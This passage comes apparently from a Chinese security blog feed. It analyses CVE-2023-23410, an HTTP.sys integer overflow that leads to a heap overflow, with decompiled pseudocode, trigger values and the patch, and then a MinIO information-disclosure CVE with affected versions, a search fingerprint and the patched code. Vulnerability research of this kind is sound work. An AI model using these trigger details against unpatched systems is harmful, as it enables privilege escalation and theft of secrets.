v25<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v35[<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>);</span></span><span style="display:flex;"><span> v37<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v24<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v28<span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFFFFFFFFFEu</span>i64);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span> v32<span style="color:#f92672">+</span> (((_DWORD)v25<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFE</span>)<span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v31;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(v28,<span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span><span style="color:#66d9ef">void</span><span style="color:#f92672">**</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>),<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>));<span style="color:#75715e">// 触发漏洞</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v25<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>v28[<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v27<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)];</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v35<span style="color:#f92672">=</span> v25;</span></span><span style="display:flex;"><span> v34<span style="color:#f92672">=</span><span style="color:#f92672">++</span>v26;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)v36;</span></span><span style="display:flex;"><span> v22<span style="color:#f92672">=</span> v39;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_31;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>LABEL_32:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)(OutputBufferForOutDirect<span style="color:#f92672">+</span><span style="color:#ae81ff">0x80000000</span>)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> OutputBufferForOutDirect<span style="color:#f92672">==</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2147483643</span> )</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v3<span style="color:#f92672">=</span> v6;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)OutputBufferForOutDirect;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在<code>UlpComputeChannelBindConfigSize</code>函数中存在整数溢出，该函数伪代码如下，rsi+10h处指向了用户传入的<code>HTTP_CHANNEL_BIND_INFO</code>结构体，该结构体定义如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _HTTP_CHANNEL_BIND_INFO</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening;</span></span><span style="display:flex;"><span> ULONG Flags;</span></span><span style="display:flex;"><span> PHTTP_SERVICE_BINDING_BASE<span style="color:#f92672">*</span> ServiceNames;</span></span><span style="display:flex;"><span> ULONG NumberOfServiceNames;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>} HTTP_CHANNEL_BIND_INFO,<span style="color:#f92672">*</span>PHTTP_CHANNEL_BIND_INFO;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">enum</span> _HTTP_AUTHENTICATION_HARDENING_LEVELS</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> HttpAuthenticationHardeningLegacy<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>,</span></span><span style="display:flex;"><span> HttpAuthenticationHardeningMedium,</span></span><span style="display:flex;"><span> HttpAuthenticationHardeningStrict</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>} HTTP_AUTHENTICATION_HARDENING_LEVELS;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _HTTP_SERVICE_BINDING_BASE</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> HTTP_SERVICE_BINDING_TYPE Type;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>} HTTP_SERVICE_BINDING_BASE,<span style="color:#f92672">*</span>PHTTP_SERVICE_BINDING_BASE;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _HTTP_SERVICE_BINDING_A</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> HTTP_SERVICE_BINDING_BASE Base;</span></span><span style="display:flex;"><span> PCHAR Buffer;</span></span><span style="display:flex;"><span> ULONG BufferSize;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>} HTTP_SERVICE_BINDING_A,<span style="color:#f92672">*</span>PHTTP_SERVICE_BINDING_A;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _HTTP_SERVICE_BINDING_W</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> HTTP_SERVICE_BINDING_BASE Base;</span></span><span style="display:flex;"><span> PWCHAR Buffer;</span></span><span style="display:flex;"><span> ULONG BufferSize;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>} HTTP_SERVICE_BINDING_W,<span style="color:#f92672">*</span>PHTTP_SERVICE_BINDING_W;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">UlpComputeChannelBindConfigSize</span>(<span style="color:#66d9ef">__int64</span> a1, IRP<span style="color:#f92672">*</span>a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v4;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v6;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v7;<span style="color:#75715e">// r9</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> _DWORD<span style="color:#f92672">*</span>v8;<span style="color:#75715e">// r8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span><span style="color:#a6e22e">IoIs32bitProcess</span>(a2)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">?</span><span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">24</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)a1<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v5 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v5<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">+=</span> (<span style="color:#a6e22e">IoIs32bitProcess</span>(a2)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">?</span><span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">*</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">IoIs32bitProcess</span>(a2);</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);<span style="color:#75715e">// HTTP_CHANNEL_BIND_INFO 结构体</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span> v6);<span style="color:#75715e">// ServiceName 结构体</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>v8<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span> )<span style="color:#75715e">// 如果是HttpServiceBindingTypeW 则进入</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v4<span style="color:#f92672">=</span> (v4<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFE</span>;</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">+=</span> v8[<span style="color:#ae81ff">4</span>];<span style="color:#75715e">// V8是enum HTTP_SERVICE_BINDING_BASE类型，占4个字节，则V8[4]就是V8 后面16个字节，即BufferSize</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v6<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v6<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v6<span style="color:#f92672">&lt;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) );</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v4;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>该函数遍历<code>HTTP_CHANNEL_BIND_INFO</code>结构体的<code>ServiceNames HTTP_SERVICE_BINDING_W</code>指针数组的<code>BufferSize</code>，并相加，而后将其返回，其中v4为unsigned int类型，而BufferSize为ULONG类型，均为四个字节，当循环相加时，如果BufferSize * NumberOfServiceNames 和v4相加超出0xFFFFFFFF则会产生整数溢出，使得UlpComputeChannelBindConfigSize返回的内存大小小于实际所需的内存大小。在调试器中可以看到在执行完fffff805`7984c899 03d9 add ebx, ecx后，将产生溢出，ebx变为0x28。</p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/61c62756-de07-4171-82de-71573ecc7c7b/Untitled.png" alt="Untitled" path="vulnerability/" if="vulnerability/CVE-2023-23410-Windows-HTTP-sys-EoP.zh-cn.md"/></p><p>返回到上层函数，<code>UlCopyChannelBindConfigToIrp</code> 调用UxGetOutputBufferForOutDirect获取到用户传入的缓冲区大小，此时v41值为0x140</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>retCode<span style="color:#f92672">=</span><span style="color:#a6e22e">HttpQueryUrlGroupProperty</span>(urlGroupId, HttpServerChannelBindProperty,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>data_temp1,<span style="color:#ae81ff">0x140</span>,<span style="color:#f92672">&amp;</span>return_len);</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v43<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">IoIs32bitProcess</span>(a2) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">IoIs32bitProcess</span>(a2);</span></span><span style="display:flex;"><span> OutputBufferForOutDirect<span style="color:#f92672">=</span><span style="color:#a6e22e">UxGetOutputBufferForOutDirect</span>(</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)a2,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">__int64</span>)CurrentStackLocation,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10u</span>,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>i64,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>v31,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>v32,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>v41);</span></span><span style="display:flex;"><span> v33<span style="color:#f92672">=</span> OutputBufferForOutDirect;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( OutputBufferForOutDirect<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">></span> v41 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> OutputBufferForOutDirect<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2147483643</span>;</span></span><span style="display:flex;"><span> v33<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2147483643</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (WPP_MAIN_CB.StackSize<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#ae81ff">43</span>i64;</span></span><span style="display:flex;"><span>LABEL_6:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_D</span>(v10,<span style="color:#f92672">&amp;</span>WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids,<span style="color:#ae81ff">2147483653</span>i64);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_32;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="Untitled" src="/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/1.png"/></p><p>由于在HTTP!UlpComputeChannelBindConfigSize中发生整数溢出，导致HTTP!UlpComputeChannelBindConfigSize返回值小于用户提供的0x140，绕过了内存大小检查，在后面通过memcpy将HTTP_CHANNEL_BIND_INFO结构体的PHTTP_SERVICE_BINDING_BASE的Buffer成员拷贝到指定内存中，拷贝长度为BufferSize，即用户提供的0x<em>F0F0EF0</em></p><p><img alt="Untitled" src="/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/2.png"/></p><p>0x<em>F0F0EF0</em>远大于用户输入的缓冲区0x1000，导致堆溢出。</p><h3 id="补丁">补丁</h3><p>通过bindiff可知，在补丁中增加了对BufferSize进行判断的逻辑，判断BufferSize是否小于0xFFFC</p><p><img alt="Untitled" src="/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/diff.png"/></p><p><img alt="Untitled" src="/images/vulnerability/CVE-2023-23410-Windows-HTTP.sys-EoP.zh-cn.assets/4.png"/></p><p>由于ServiceName最大数量限制为0x40，则0x40 * 0xFFFC = 3FFF00，不能产生溢出，修复了该漏洞。</p><p>参考资料</p><blockquote><p><a href="https://www.freebuf.com/vuls/364920.html" target="_blank">https://www.freebuf.com/vuls/364920.html</a></p></blockquote><p><strong>Created at 2023-05-05T20:59:45+08:00</strong></p></description></item><item><title>CVE-2021-3156 Sudo 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/</link><pubDate>Fri, 05 May 2023 20:54:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-3156-sudo-eop/</guid><description><p><strong>Created at 2023-05-05T20:54:20+08:00</strong></p></description></item><item><title>CVE-2023-28432 MinIO 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</link><pubDate>Fri, 05 May 2023 20:53:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/</guid><description><h3 id="基本信息">基本信息</h3><p>Minio是一个多云对象存储框架。在从 RELEASE.2019-12-17T23-16-33Z 开始且 RELEASE.2023-03-20T20-16-18Z 之前的集群部署中，MinIO 返回所有环境变量，包括“MINIO_SECRET_KEY”和“MINIO_ROOT_PASSWORD”，从而导致信息泄露。分布式部署的所有用户都会受到影响。建议所有用户升级到发布版本.2023-03-20T20-16-18Z。</p><h4 id="指纹">指纹</h4><p>web.title=&ldquo;minio&rdquo;</p><h3 id="影响版本">影响版本</h3><p>2019-12-17t23-16-33z &lt;= Minio &lt; 2023-03-20t20-16-18z</p><h3 id="环境搭建">环境搭建</h3><p>使用Docker启动4个minio即可。</p><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>补丁分析</strong>
对比修复版本和未修复版本<a href="https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z...RELEASE.2023-03-20T20-16-18Z" target="_blank">https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z&hellip;RELEASE.2023-03-20T20-16-18Z</a>可知漏洞在commit<a href="https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077" target="_blank">https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077</a>修复，查看修复代码，可以知道在<code>cmd/bootstrap-peer-server.go#VerifyHandler</code>方法中增加了鉴权逻辑：<img alt="" src="/images/vulnerability/CVE-2023-28432-MinIO-information-disclosure.zh-cn.assets/1.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span><span style="color:#a6e22e">storageServerRequestValidate</span>(<span style="color:#a6e22e">r</span><span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>)<span style="color:#66d9ef">error</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">token</span>,<span style="color:#a6e22e">err</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">jwtreq</span>.<span style="color:#a6e22e">AuthorizationHeaderExtractor</span>.<span style="color:#a6e22e">ExtractToken</span>(<span style="color:#a6e22e">r</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">err</span><span style="color:#f92672">!=</span><span style="color:#66d9ef">nil</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">err</span><span style="color:#f92672">==</span><span style="color:#a6e22e">jwtreq</span>.<span style="color:#a6e22e">ErrNoTokenInRequest</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">errNoAuthToken</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">errMalformedAuth</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">claims</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">xjwt</span>.<span style="color:#a6e22e">NewStandardClaims</span>()</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">err</span> =<span style="color:#a6e22e">xjwt</span>.<span style="color:#a6e22e">ParseWithStandardClaims</span>(<span style="color:#a6e22e">token</span>,<span style="color:#a6e22e">claims</span>, []byte(<span style="color:#a6e22e">globalActiveCred</span>.<span style="color:#a6e22e">SecretKey</span>));<span style="color:#a6e22e">err</span><span style="color:#f92672">!=</span><span style="color:#66d9ef">nil</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">errAuthentication</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">owner</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">claims</span>.<span style="color:#a6e22e">AccessKey</span><span style="color:#f92672">==</span><span style="color:#a6e22e">globalActiveCred</span>.<span style="color:#a6e22e">AccessKey</span><span style="color:#f92672">||</span><span style="color:#a6e22e">claims</span>.<span style="color:#a6e22e">Subject</span><span style="color:#f92672">==</span><span style="color:#a6e22e">globalActiveCred</span>.<span style="color:#a6e22e">AccessKey</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">owner</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">errAuthentication</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">claims</span>.<span style="color:#a6e22e">Audience</span><span style="color:#f92672">!=</span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">RawQuery</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">errAuthentication</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">requestTimeStr</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">"X-Minio-Time"</span>)</span></span><span style="display:flex;"><span><span style="color:#a6e22e">requestTime</span>,<span style="color:#a6e22e">err</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">RFC3339</span>,<span style="color:#a6e22e">requestTimeStr</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">err</span><span style="color:#f92672">!=</span><span style="color:#66d9ef">nil</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">errMalformedAuth</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">utcNow</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">UTCNow</span>()</span></span><span style="display:flex;"><span><span style="color:#a6e22e">delta</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">requestTime</span>.<span style="color:#a6e22e">Sub</span>(<span style="color:#a6e22e">utcNow</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">delta</span> &lt;<span style="color:#ae81ff">0</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">delta</span><span style="color:#f92672">*=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#a6e22e">delta</span> ><span style="color:#a6e22e">DefaultSkewTime</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">errSkewedAuthTime</span></span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">nil</span></span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>而<code>VerifyHandler</code>方法对应的路由在<code>cmd/bootstrap-peer-server.go#registerBootstrapRESTHandlers</code>注册，对应的路径为<code>bootstrapRESTPrefix+bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span><span style="color:#a6e22e">registerBootstrapRESTHandlers</span>(<span style="color:#a6e22e">router</span><span style="color:#f92672">*</span><span style="color:#a6e22e">mux</span>.<span style="color:#a6e22e">Router</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">h</span><span style="color:#f92672">:=</span><span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">f</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandlerFunc</span>)<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandlerFunc</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">collectInternodeStats</span>(<span style="color:#a6e22e">httpTraceHdrs</span>(<span style="color:#a6e22e">f</span>))</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">server</span><span style="color:#f92672">:=</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">bootstrapRESTServer</span>{}</span></span><span style="display:flex;"><span><span style="color:#a6e22e">subrouter</span><span style="color:#f92672">:=</span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">PathPrefix</span>(<span style="color:#a6e22e">bootstrapRESTPrefix</span>).<span style="color:#a6e22e">Subrouter</span>()</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">subrouter</span>.<span style="color:#a6e22e">Methods</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">MethodPost</span>).<span style="color:#a6e22e">Path</span>(<span style="color:#a6e22e">bootstrapRESTVersionPrefix</span><span style="color:#f92672">+</span><span style="color:#a6e22e">bootstrapRESTMethodHealth</span>).<span style="color:#a6e22e">HandlerFunc</span>(</span></span><span style="display:flex;"><span><span style="color:#a6e22e">h</span>(<span style="color:#a6e22e">server</span>.<span 